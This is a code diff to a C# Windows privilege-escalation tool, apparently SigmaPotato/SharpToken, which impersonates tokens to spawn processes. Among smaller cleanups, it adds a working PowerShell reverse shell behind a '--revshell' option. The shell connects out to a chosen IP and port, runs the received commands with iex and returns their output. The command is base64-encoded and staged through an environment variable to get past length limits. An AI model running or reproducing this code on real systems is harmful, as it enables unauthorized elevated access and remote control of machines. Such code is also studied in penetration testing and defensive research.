@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
+using System.Net.Security;
 using System.Runtime.CompilerServices;
 using System.Runtime.ConstrainedExecution;
 using System.Runtime.InteropServices;
@@ -818,7 +819,8 @@ namespace SharpToken
                         offset += Marshal.SizeOf(typeof(SID_AND_ATTRIBUTES));
                         goups.Add(securityIdentifier.Translate(typeof(NTAccount)).Value);
                     }
-                    catch (Exception e)
+                    //catch (Exception e)
+                    catch
                     {
                         continue;
                     }
@@ -1063,7 +1065,7 @@ namespace SharpToken
         public uint Reserved;
     }
 
-    public class TokenuUils
+    public class TokenUtils
     {
         private static readonly int tokenType = getTokenType();
 
@@ -1122,7 +1124,7 @@ namespace SharpToken
             Process currentProcess = Process.GetCurrentProcess();
             WindowsIdentity windowsIdentity = WindowsIdentity.GetCurrent();
             IntPtr currentThreadToken = windowsIdentity.Token;
-            SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX[] handles = TokenuUils.ListSystemHandle();
+            SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX[] handles = TokenUtils.ListSystemHandle();
             for (int i = 0; i < handles.Length; i++)
             {
                 SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handleEntry = handles[i];
@@ -1304,50 +1306,54 @@ namespace SharpToken
             string bootstrap = "powershell -e ([Convert]::ToString($env:Sigma))"; // Work
             */
 
-            string bootstrap = "powershell -c (powershell -e $env:Sigma)"; // Yet this dumb shit worked
-            string envVar = "Sigma";
+            string bootstrap = "powershell -c (powershell -e $env:SigmaBootstrap)"; // Yet this dumb shit worked
+            string envVar = "SigmaBootstrap";
             string envMessage = "Command";
             IntPtr environmentBlock = IntPtr.Zero; // Default pointer if bootstrapping isn't required
 
             Console.WriteLine($"[+] Current Command Length: {commandLine.Length} characters");
 
 
-            // Command exceeds character limit AND is using PowerShell attempt to bypass 1024 char limit
+            // Command exceeds 1024 character limit AND is using PowerShell attempt to bootstrap to an environment variable
             if ((commandLine.Length > 1024 &&
                 commandLine.StartsWith("powershell", StringComparison.OrdinalIgnoreCase)) ||
                 commandLine == "--revshell")
             {
 
-                // ATTEMPTING TO ADD SIMPLE REVSHELL
+                // Set command to robust Powershell 2.0+ compatible Reverse Shell w/ Error Output
                 if (commandLine == "--revshell")
                 {
                     Console.WriteLine("---\n[+] Creating a simple PowerShell reverse shell...");
                     Console.WriteLine($"[+] IP Address: {IpAddress} | Port: {Port}");
 
-
-                    // Powershell 2.0+ Compatible Reverse Shell w/ Error Output
                     commandLine = $@"
 Try {{
-$Client = New-Object -TypeName System.Net.Sockets.TcpClient(""{IpAddress}"",{Port})
-$Stream = $Client.GetStream()
-[byte[]]$Buffer = 0..65535 | % {{0}}
-$LastError = $Error[0]
-while (($Data = $Stream.Read($Buffer,0,$Buffer.Length)) -ne 0) {{
-    $Command   = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Buffer,0,$Data)
-    $Execution = (iex $Command 2>&1 | Out-String)
-    if ($Error[0] -ne $LastError) {{ $LastError = $Error[0]; $Execution += ""$LastError`n"" }}
-    $OutString = $Execution + ""PS "" + (PWD).Path + ""> ""
-    $OutBytes  = ([Text.Encoding]::ASCII).GetBytes($OutString)
-    $Stream.Write($OutBytes,0,$OutBytes.Length)
+$RevShellClient = New-Object -TypeName System.Net.Sockets.TcpClient('{IpAddress}', {Port})
+$Stream = $RevShellClient.GetStream()
+[byte[]]$DataBuffer = 0..65535 | % {{0}}
+$OutputBuffer = New-Object -TypeName System.IO.StringWriter
+[System.Console]::SetOut($OutputBuffer)
+while (($i = $Stream.Read($DataBuffer,0,$DataBuffer.Length)) -ne 0) {{
+    Try {{
+        $Command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($DataBuffer,0,$i)
+        $CommandOutput = (iex $Command 2>&1 | Out-String)
+    }} Catch {{$CommandOutput = ""$($Error[0])`n""}}
+    $OutputBuffer.Write($CommandOutput)
+    $PromptString = $OutputBuffer.ToString() + 'PS ' + (PWD).Path + '> '
+    $PromptBytes = ([Text.Encoding]::ASCII).GetBytes($PromptString)
+    $Stream.Write($PromptBytes,0,$PromptBytes.Length)
     $Stream.Flush()
+    $OutputBuffer.GetStringBuilder().Clear() | Out-Null
 }}
-$Client.Close()
+$OutputBuffer.Close()
+$RevShellClient.Close()
 }}
 Catch {{
     $ErrorMessage = $Error[0]
-    echo ""[-] Reverse shell unsuccessful. Message: $ErrorMessage""
+    echo ""[-] Reverse shell was unsuccessful. Error Message: `n$ErrorMessage""
 }}
 ";
+                    
                     Console.WriteLine("[+] Bootstrapping to an environment variable...");
                     envMessage = "Payload";
                 }
@@ -1356,6 +1362,7 @@ Catch {{
                     Console.WriteLine("---\n[+] PowerShell command length exceeded 1024 character limit.");
                     Console.WriteLine("[+] Bootstrapping to an environment variable...");
                 }
+
 
                 string b64Command = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(commandLine));
                 
@@ -1410,33 +1417,35 @@ Catch {{
                 isCreate =  true;
             }
 
+
             if (isClose)
             {
                 NativeMethod.CloseHandle(tokenHandle);
             }
 
-            return isCreate;
 
+            return isCreate;
         }
 
-        // Added args for Revshell
-        public static void createProcessReadOut(TextWriter consoleWriter, IntPtr tokenHandle, string commandLine, string IpAddress, int Port)
+
+        public static void createProcessReadOut(out string ProcessOutput, TextWriter ConsoleWriter, IntPtr tokenHandle, string commandLine, string IpAddress, int Port)
         {
+
+            // Added to capture Process Output (Update: Not working with .NET Reflection)
+            ProcessOutput = null;
+
             IntPtr childProcessStdOutRead = IntPtr.Zero;
             IntPtr childProcessStdOutWrite = IntPtr.Zero;
 
             FileStream childProcessReadStream = null;
 
             PROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();
-
-            //初始化安全属性 (what?)
             SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();
 
             securityAttributes.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
             securityAttributes.pSecurityDescriptor = IntPtr.Zero;
             securityAttributes.bInheritHandle = true;
 
-            //初始化子进程输出 (what?) 
 
             if (!NativeMethod.CreatePipe(out childProcessStdOutRead, out childProcessStdOutWrite,
                     ref securityAttributes, 8196))
@@ -1454,13 +1463,13 @@ Catch {{
 
             NativeMethod.SetHandleInformation(childProcessStdOutRead, NativeMethod.HANDLE_FLAG_INHERIT, NativeMethod.HANDLE_FLAG_INHERIT);
             NativeMethod.SetHandleInformation(childProcessStdOutWrite, NativeMethod.HANDLE_FLAG_INHERIT, NativeMethod.HANDLE_FLAG_INHERIT);
-            
-            // Added args for RevShell
+
+
             if (CreateProcess(tokenHandle, commandLine, true, (uint)ProcessCreateFlags.CREATE_NO_WINDOW, ref startupInfo,
                     out processInformation, IpAddress, Port))
             {
                 // SigmaPotato: Improved visual formatting.
-                consoleWriter.WriteLine($"[+] Process Started with PID: {processInformation.dwProcessId}");
+                ConsoleWriter.WriteLine($"[+] Process Started with PID: {processInformation.dwProcessId}");
 
                 NativeMethod.CloseHandle(childProcessStdOutWrite);
                 childProcessStdOutWrite = IntPtr.Zero;
@@ -1476,6 +1485,7 @@ Catch {{
                 bool endOutput = false; 
                 string outString = null;
 
+
                 while (true)
                 {
 
@@ -1490,9 +1500,7 @@ Catch {{
                         // Visual Formatting for Process Output
                         if (beginOutput == true)
                         {
-                            consoleWriter.WriteLine("\n--------------");
-                            consoleWriter.WriteLine("PROCESS OUTPUT");
-                            consoleWriter.WriteLine("--------------");
+                            ConsoleWriter.WriteLine("\n[+] Process Output:");
                             beginOutput = false;
                         }
 
@@ -1503,7 +1511,8 @@ Catch {{
 
                         if (!outString.Contains("<Obj") && !outString.Contains("CLIXML"))
                         {
-                            consoleWriter.Write(outString);
+                            ConsoleWriter.Write(outString);
+                            ProcessOutput = outString; // Currently not working with .NET Reflection.
                         }
 
 
@@ -1513,15 +1522,12 @@ Catch {{
                 }
                 if (endOutput == true)
                 {
-                    consoleWriter.WriteLine("");
+                    ConsoleWriter.WriteLine("");
                 }
                 else
                 {
-                    consoleWriter.WriteLine("\n-------------------");
-                    consoleWriter.WriteLine("PROCESS OUTPUT NULL");
-                    consoleWriter.WriteLine("-------------------\n");
+                    ConsoleWriter.WriteLine("\n[+] Process returned no output.\n");
                 }
-
             }
             else
             {
@@ -1529,23 +1535,23 @@ Catch {{
                 // Added more verbose troubleshooting
                 if (Marshal.GetLastWin32Error() == -2147024809)
                 {
-                    consoleWriter.WriteLine("\n[-] Failed to create process! Win32Error: -2147024809 ('E_INVALIDARG')");
-                    consoleWriter.WriteLine("    o (Hint: This likely means the command is severely mistyped or exceeds the character limit.)\n");
+                    ConsoleWriter.WriteLine("\n[-] Failed to create process! Win32Error: -2147024809 ('E_INVALIDARG')");
+                    ConsoleWriter.WriteLine(" o (Hint: this likely means the command is severely mistyped or exceeds the character limit)\n");
                 }
                 else if (Marshal.GetLastWin32Error() == 2)
                 {
-                    consoleWriter.WriteLine("\n[-] Failed to create process! Win32Error: 2 ('ERROR_FILE_NOT_FOUND')");
-                    consoleWriter.WriteLine("    o (Hint: This likely means the executable specified is either mistyped or needs an absolute path.)\n");
+                    ConsoleWriter.WriteLine("\n[-] Failed to create process! Win32Error: 2 ('ERROR_FILE_NOT_FOUND')");
+                    ConsoleWriter.WriteLine(" o  (Hint: this likely means the executable specified is either mistyped or needs an absolute path)\n");
                 }
                 else if (Marshal.GetLastWin32Error() == 1314)
                 {
-                    consoleWriter.WriteLine("\n[-] Failed to create process! Win32Error: 1314 ('ERROR_PRIVILEGE_NOT_HELD')");
-                    consoleWriter.WriteLine("    o (Hint: This likely means the current user doesn't have 'SeImpersonatePrivilege' or 'SeAssignPrimaryTokenPrivilege' user rights.)\n");
+                    ConsoleWriter.WriteLine("\n[-] Failed to create process! Win32Error: 1314 ('ERROR_PRIVILEGE_NOT_HELD')");
+                    ConsoleWriter.WriteLine(" o  (Hint: this likely means the current user doesn't have 'SeImpersonatePrivilege' user rights)\n");
                 }
                 else
                 {
-                    consoleWriter.WriteLine($"\n[-] Failed to create process! Win32Error: {Marshal.GetLastWin32Error()} (Unknown)");
-                    consoleWriter.WriteLine("    o (Hint: This isn't a common error code, so no user tip for you unfortunately.)\n");
+                    ConsoleWriter.WriteLine($"\n[-] Failed to create process! Win32Error: {Marshal.GetLastWin32Error()} (Unknown)");
+                    ConsoleWriter.WriteLine(" o  (Hint: this isn't a common error code, so no user tip for you unfortunately)\n");
                 }
             }
 
